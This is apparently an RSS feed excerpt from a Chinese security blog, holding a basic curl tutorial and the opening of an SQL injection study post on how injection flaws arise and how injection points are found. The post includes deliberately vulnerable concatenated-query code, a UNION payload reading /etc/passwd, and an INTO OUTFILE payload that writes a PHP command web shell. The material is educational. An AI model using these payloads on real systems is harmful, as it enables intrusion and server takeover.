&lt;h2 id=&#34;curl&#34;&gt;&lt;a href=&#34;#curl&#34; class=&#34;headerlink&#34; title=&#34;curl&#34;&gt;&lt;/a&gt;curl&lt;/h2&gt;&lt;p&gt;&lt;code&gt;curl&lt;/code&gt; 是一个非常强大的命令行工具，用于从命令行传输数据。它支持多种协议，如 HTTP, HTTPS, FTP, 和 SMTP。你可以用它来发送 GET 请求、POST 请求、下载文件，甚至与 API 交互。以下是 &lt;code&gt;curl&lt;/code&gt; 的一些基本用法示例。&lt;/p&gt;
&lt;h3 id=&#34;1-基本用法&#34;&gt;&lt;a href=&#34;#1-基本用法&#34; class=&#34;headerlink&#34; title=&#34;1. 基本用法&#34;&gt;&lt;/a&gt;1. 基本用法&lt;/h3&gt;&lt;p&gt;最简单的 &lt;code&gt;curl&lt;/code&gt; 用法就是发送一个 GET 请求并输出响应内容：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;&lt;span class=&#34;token function&#34;&gt;curl&lt;/span&gt; http://example.com&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这会在终端中显示 &lt;code&gt;http://example.com&lt;/code&gt; 的网页内容。&lt;/p&gt;
&lt;h3 id=&#34;2-保存响应到文件&#34;&gt;&lt;a href=&#34;#2-保存响应到文件&#34; class=&#34;headerlink&#34; title=&#34;2. 保存响应到文件&#34;&gt;&lt;/a&gt;2. 保存响应到文件&lt;/h3&gt;&lt;p&gt;使用 &lt;code&gt;-o&lt;/code&gt; 选项可以将响应保存到文件中：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;&lt;span class=&#34;token function&#34;&gt;curl&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-o&lt;/span&gt; example.html http://example.com&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这会将 &lt;code&gt;example.com&lt;/code&gt; 的内容保存到 &lt;code&gt;example.html&lt;/code&gt; 文件中。&lt;/p&gt;
&lt;h3 id=&#34;3-发送-POST-请求&#34;&gt;&lt;a href=&#34;#3-发送-POST-请求&#34; class=&#34;headerlink&#34; title=&#34;3. 发送 POST 请求&#34;&gt;&lt;/a&gt;3. 发送 POST 请求&lt;/h3&gt;&lt;p&gt;你可以使用 &lt;code&gt;-d&lt;/code&gt; 选项发送 POST 请求。以下是一个发送表单数据的例子：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;&lt;span class=&#34;token function&#34;&gt;curl&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-d&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;name=John&amp;amp;age=30&#34;&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-X&lt;/span&gt; POST http://example.com/post&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;-X&lt;/code&gt; 选项用于指定请求方法。在这里，我们明确指定为 POST 请求。&lt;/p&gt;
&lt;h3 id=&#34;4-使用自定义请求头&#34;&gt;&lt;a href=&#34;#4-使用自定义请求头&#34; class=&#34;headerlink&#34; title=&#34;4. 使用自定义请求头&#34;&gt;&lt;/a&gt;4. 使用自定义请求头&lt;/h3&gt;&lt;p&gt;你可以使用 &lt;code&gt;-H&lt;/code&gt; 选项添加自定义请求头：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;&lt;span class=&#34;token function&#34;&gt;curl&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-H&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Authorization: Bearer your_token_here&#34;&lt;/span&gt; http://example.com/secure&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这在访问需要认证的 API 时非常有用。&lt;/p&gt;
&lt;h3 id=&#34;5-下载文件&#34;&gt;&lt;a href=&#34;#5-下载文件&#34; class=&#34;headerlink&#34; title=&#34;5. 下载文件&#34;&gt;&lt;/a&gt;5. 下载文件&lt;/h3&gt;&lt;p&gt;使用 &lt;code&gt;-O&lt;/code&gt; 选项可以直接下载文件，并保留文件的原始名称：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;&lt;span class=&#34;token function&#34;&gt;curl&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-O&lt;/span&gt; http://example.com/file.zip&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这会将 &lt;code&gt;file.zip&lt;/code&gt; 下载到当前目录。&lt;/p&gt;
&lt;h3 id=&#34;6-处理重定向&#34;&gt;&lt;a href=&#34;#6-处理重定向&#34; class=&#34;headerlink&#34; title=&#34;6. 处理重定向&#34;&gt;&lt;/a&gt;6. 处理重定向&lt;/h3&gt;&lt;p&gt;默认情况下，&lt;code&gt;curl&lt;/code&gt; 不会跟随重定向。你可以使用 &lt;code&gt;-L&lt;/code&gt; 选项让它跟随重定向：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;&lt;span class=&#34;token function&#34;&gt;curl&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-L&lt;/span&gt; http://short.url&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这会跟随重定向到最终的 URL 并获取内容。&lt;/p&gt;
&lt;h3 id=&#34;7-显示详细信息&#34;&gt;&lt;a href=&#34;#7-显示详细信息&#34; class=&#34;headerlink&#34; title=&#34;7. 显示详细信息&#34;&gt;&lt;/a&gt;7. 显示详细信息&lt;/h3&gt;&lt;p&gt;如果你想查看请求和响应的详细信息，可以使用 &lt;code&gt;-v&lt;/code&gt; 选项：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;&lt;span class=&#34;token function&#34;&gt;curl&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-v&lt;/span&gt; http://example.com&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这会显示所有请求头、响应头以及其它调试信息。&lt;/p&gt;
&lt;h3 id=&#34;8-使用代理&#34;&gt;&lt;a href=&#34;#8-使用代理&#34; class=&#34;headerlink&#34; title=&#34;8. 使用代理&#34;&gt;&lt;/a&gt;8. 使用代理&lt;/h3&gt;&lt;p&gt;如果你需要通过代理访问网络资源，可以使用 &lt;code&gt;-x&lt;/code&gt; 选项：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;&lt;span class=&#34;token function&#34;&gt;curl&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-x&lt;/span&gt; http://proxy.example.com:8080 http://example.com&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;9-上传文件&#34;&gt;&lt;a href=&#34;#9-上传文件&#34; class=&#34;headerlink&#34; title=&#34;9. 上传文件&#34;&gt;&lt;/a&gt;9. 上传文件&lt;/h3&gt;&lt;p&gt;你可以使用 &lt;code&gt;-F&lt;/code&gt; 选项上传文件：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;&lt;span class=&#34;token function&#34;&gt;curl&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-F&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;file=@/path/to/file&#34;&lt;/span&gt; http://example.com/upload&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这会将指定的文件上传到服务器。&lt;/p&gt;
&lt;h3 id=&#34;10-指定请求方法&#34;&gt;&lt;a href=&#34;#10-指定请求方法&#34; class=&#34;headerlink&#34; title=&#34;10. 指定请求方法&#34;&gt;&lt;/a&gt;10. 指定请求方法&lt;/h3&gt;&lt;p&gt;尽管 &lt;code&gt;curl&lt;/code&gt; 默认发送的是 GET 请求，你也可以使用 &lt;code&gt;-X&lt;/code&gt; 选项指定其他方法，如 PUT, DELETE 等：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;&lt;span class=&#34;token function&#34;&gt;curl&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-X&lt;/span&gt; DELETE http://example.com/resource/123&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;进阶用法&#34;&gt;&lt;a href=&#34;#进阶用法&#34; class=&#34;headerlink&#34; title=&#34;进阶用法&#34;&gt;&lt;/a&gt;进阶用法&lt;/h3&gt;&lt;p&gt;&lt;code&gt;curl&lt;/code&gt; 还支持更多复杂的用法，如通过 &lt;code&gt;--data-binary&lt;/code&gt; 发送原始二进制数据、使用 &lt;code&gt;--header&lt;/code&gt; 添加多个请求头、通过 &lt;code&gt;-u&lt;/code&gt; 进行 HTTP 基本认证等。&lt;/p&gt;
&lt;p&gt;如果你想查看 &lt;code&gt;curl&lt;/code&gt; 的所有功能和选项，可以通过以下命令查看手册：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;&lt;span class=&#34;token function&#34;&gt;man&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;curl&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;或者查看帮助文档：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;&lt;span class=&#34;token function&#34;&gt;curl&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;--help&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://0xdadream.github.io/2021/07/19/sql/</guid>
            <title>SQL注入学习</title>
            <link>https://0xdadream.github.io/2021/07/19/sql/</link>
            <category>sql</category>
            <category>学习</category>
            <pubDate>Mon, 19 Jul 2021 09:25:00 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;SQL注入学习&#34;&gt;&lt;a href=&#34;#SQL注入学习&#34; class=&#34;headerlink&#34; title=&#34;SQL注入学习&#34;&gt;&lt;/a&gt;SQL注入学习&lt;/h1&gt;&lt;h2 id=&#34;原理&#34;&gt;&lt;a href=&#34;#原理&#34; class=&#34;headerlink&#34; title=&#34;原理&#34;&gt;&lt;/a&gt;原理&lt;/h2&gt;&lt;h3 id=&#34;数据库与web交互&#34;&gt;&lt;a href=&#34;#数据库与web交互&#34; class=&#34;headerlink&#34; title=&#34;数据库与web交互&#34;&gt;&lt;/a&gt;数据库与web交互&lt;/h3&gt;&lt;p&gt;数据库驱动的Web应用通常包含三层：表示层、逻辑层和存储层&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/bd917bb464f4ecc0a70931647924489c.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Web浏览器（表示层）向中间层（逻辑层）发送请求，后者依次调用由位于应用层 的应用服务器提供的API，应用层通过查询、更新数据库（存储层）来响应该请求。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/fb4fe488ca6064bb837f649984e43f12.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;SQL注入的产生过程&#34;&gt;&lt;a href=&#34;#SQL注入的产生过程&#34; class=&#34;headerlink&#34; title=&#34;SQL注入的产生过程&#34;&gt;&lt;/a&gt;&lt;strong&gt;SQL&lt;/strong&gt;注入的产生过程&lt;/h3&gt;&lt;h4 id=&#34;构造动态字符串&#34;&gt;&lt;a href=&#34;#构造动态字符串&#34; class=&#34;headerlink&#34; title=&#34;构造动态字符串&#34;&gt;&lt;/a&gt;构造动态字符串&lt;/h4&gt;&lt;p&gt;简单来说就是将得到参数拼接到查询语句，然后执行，下列不当将会导致SQL注入&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;TABLE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; FIELD &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;input&#39;&lt;/span&gt;

input 在不同语言运行的服务器上写法不同
PHP
$query &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;SELECT * FROM table WHERE field =&#39;$_GET[&#34;&lt;/span&gt;input&lt;span class=&#34;token string&#34;&gt;&#34;]&#39;&#34;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;NET
query &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;SELECT * FROM table WHERE field = &#39; &#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; request&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;getParameter&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;input&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34; &#39; &#34;&lt;/span&gt; &lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;转义字符处理不当&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;$&lt;span class=&#34;token keyword&#34;&gt;SQL&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;SELECT * FROM table WHERE field = &#39;$_GET[&#34;&lt;/span&gt;input&lt;span class=&#34;token string&#34;&gt;&#34;]&#39;&#34;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;SQL数据库将单引号字符&lt;code&gt;&#39;&lt;/code&gt;解析成代码与数据间的分界线，单引号外面的内容均是需要运行的代码，而用单引号引起来的内容均是数据。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;table&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; field &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;
报错
You have an error &lt;span class=&#34;token operator&#34;&gt;in&lt;/span&gt; your &lt;span class=&#34;token keyword&#34;&gt;SQL&lt;/span&gt; syntax&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;check&lt;/span&gt; the manual that corresponds &lt;span class=&#34;token keyword&#34;&gt;to&lt;/span&gt; your MySQL server version &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; the &lt;span class=&#34;token keyword&#34;&gt;right&lt;/span&gt; syntax &lt;span class=&#34;token keyword&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;use&lt;/span&gt; near &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&#39;&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;LIMIT&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&#39; at line &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;
这是一种报错&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;出现该错误是因为单引号字符被解析成了字符串分隔符。运行时执行的SQL查询在语法上存在错误(它包含多个字符串分隔符)，所以数据库抛出异常。SQL数据库将单引号字符看作特殊字符(字符串分隔符)。&lt;/p&gt;
&lt;p&gt;当然还有其他的转义字符，比如oracle中，空格&lt;code&gt; &lt;/code&gt; 双斜线&lt;code&gt;|| &lt;/code&gt;逗号&lt;code&gt;,&lt;/code&gt; 点号&lt;code&gt;.&lt;/code&gt; &lt;code&gt;*/&lt;/code&gt;以及双引号&lt;code&gt;&#34;&lt;/code&gt; 这里不详细讲解。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;||&lt;/code&gt;将前后的执行结果连接&lt;/p&gt;
&lt;p&gt;&lt;code&gt;*/&lt;/code&gt; 结束注释&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;类型处理不当&lt;/p&gt;
&lt;p&gt;接受的参数类型不一定是字符串，也可能是数字型，这里一味地过滤单引号也就没多大用处。&lt;/p&gt;
&lt;p&gt;数字型&lt;code&gt;or 1=1&lt;/code&gt;大概判断，一旦存在并有FILE权限，就能使用下面代码注入&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;UNION&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;ALL&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; LOAD_FILE&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;/etc/passwd&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;--&lt;/span&gt;
&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;UNION&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;&amp;lt;? system($_REQUEST[&#39;cmd&#39;]); ?&amp;gt;&#34;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;INTO&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;OUTFILE&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;/var/www/html/victim.com/cmd.php&#34;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;--&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;查询语句组装不当&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$SQL&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;SELECT&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;columnl&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;,&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;column2&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;,&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;column3&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;FROM&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;table&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这种随便改个包发送，数据库基本上就没了，因为所有参数可改&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;错误处理不当&lt;/p&gt;
&lt;p&gt;就如第一个报错，报错信息完全不必展示给用户看，不展示，自然会阻断部分攻击者。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;多个提交处理不当&lt;/p&gt;
&lt;p&gt;这里有点条件竞争的意思&lt;/p&gt;
&lt;p&gt;第一个提交需要验证码，第二个却没设置，正常用户可能会从第一个提交进入，攻击者就会用第二个提交FUZZ，这就和某些应用分享一样，不验证是否成功，虚晃一招。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;不安全的数据库配置&#34;&gt;&lt;a href=&#34;#不安全的数据库配置&#34; class=&#34;headerlink&#34; title=&#34;不安全的数据库配置&#34;&gt;&lt;/a&gt;不安全的数据库配置&lt;/h4&gt;&lt;p&gt;默认的数据库系统管理员账号，预置的系统库，表，很多的默认配置都是不安全的，试想一下，知道你的管理员账号，爆破密码会降低多少数量级的难度&lt;/p&gt;
&lt;p&gt;降低权限是一个好习惯&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;--Oracle语句，列举当前用户可访问的所有表&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; OWNER&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; TABLE_NAME &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; ALL_TABLES &lt;span class=&#34;token keyword&#34;&gt;ORDER&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;BY&lt;/span&gt; TABLE_NAME&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; 
&lt;span class=&#34;token comment&#34;&gt;--MySQL语句，列举当前用户可访问的所有表和数据库&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; table_schema&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; table_name &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; information_schema&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;tables&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;--MSSQL语句，使用系统表列举所有可访问的表&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; name &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; sysobjects &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; xtype &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;U&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;--MSSQL语句，使用目录视图列举所有可访问的表&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; name &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;tables&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;SQL注入测试&#34;&gt;&lt;a href=&#34;#SQL注入测试&#34; class=&#34;headerlink&#34; title=&#34;SQL注入测试&#34;&gt;&lt;/a&gt;SQL注入测试&lt;/h2&gt;&lt;h3 id=&#34;寻找注入点&#34;&gt;&lt;a href=&#34;#寻找注入点&#34; class=&#34;headerlink&#34; title=&#34;寻找注入点&#34;&gt;&lt;/a&gt;寻找注入点&lt;/h3&gt;&lt;h4 id=&#34;借助推理进行测试&#34;&gt;&lt;a href=&#34;#借助推理进行测试&#34; class=&#34;headerlink&#34; title=&#34;借助推理进行测试&#34;&gt;&lt;/a&gt;借助推理进行测试&lt;/h4&gt;&lt;h5 id=&#34;识别数据输入&#34;&gt;&lt;a href=&#34;#识别数据输入&#34; class=&#34;headerlink&#34; title=&#34;识别数据输入&#34;&gt;&lt;/a&gt;识别数据输入&lt;/h5&gt;&lt;p&gt;GET请求、POST请求、HTTP其他与数据库有交互的都可能存在注入，比如COOKIE注入。&lt;/p&gt;
